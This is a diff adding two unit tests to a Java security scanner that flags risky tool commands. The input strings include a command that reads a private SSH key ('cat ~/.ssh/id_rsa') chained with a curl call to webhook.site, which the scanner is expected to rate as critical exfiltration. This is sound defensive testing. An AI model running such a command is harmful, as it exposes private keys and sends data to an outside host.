@@ -62,6 +62,37 @@ public class ToolRiskScannerTest {
     }
 
     /**
+     * 组合检测（行为链）：敏感文件读取 + 网络外发同时出现 → Critical 外传。
+     * 单个特征可能只是正常使用，组合出现才是高危信号。
+     */
+    @Test
+    public void sensitive_read_plus_network_out_is_critical_exfiltration() {
+        AuditResult result = securityScanner.scan(ScanRequest.of(
+                "cat ~/.ssh/id_rsa && curl https://webhook.site/demo",
+                SecurityTestSupport.toolOnly(SecurityMode.WARN)));
+        log.info("组合外传结果: {}", JSON.toJSONString(result));
+
+        assertTrue(result.getFindings().stream()
+                .anyMatch(f -> "tool_shell_exfiltration".equals(f.getRuleId())
+                        && f.getSeverity() == SecuritySeverity.CRITICAL));
+    }
+
+    /**
+     * 只读敏感文件而不外联，不命中组合外传规则。
+     */
+    @Test
+    public void sensitive_read_without_network_stays_clean_of_exfiltration() {
+        AuditResult result = securityScanner.scan(ScanRequest.of(
+                "cat ~/.ssh/id_rsa", SecurityTestSupport.toolOnly(SecurityMode.WARN)));
+        log.info("只读文件结果: {}", JSON.toJSONString(result));
+
+        assertTrue(result.getFindings().stream()
+                .noneMatch(f -> "tool_shell_exfiltration".equals(f.getRuleId())));
+        assertTrue(result.getFindings().stream()
+                .noneMatch(f -> f.getSeverity() == SecuritySeverity.CRITICAL));
+    }
+
+    /**
      * 普通说明文字中的命令名只记 Medium，不升级 Critical。
      */
     @Test
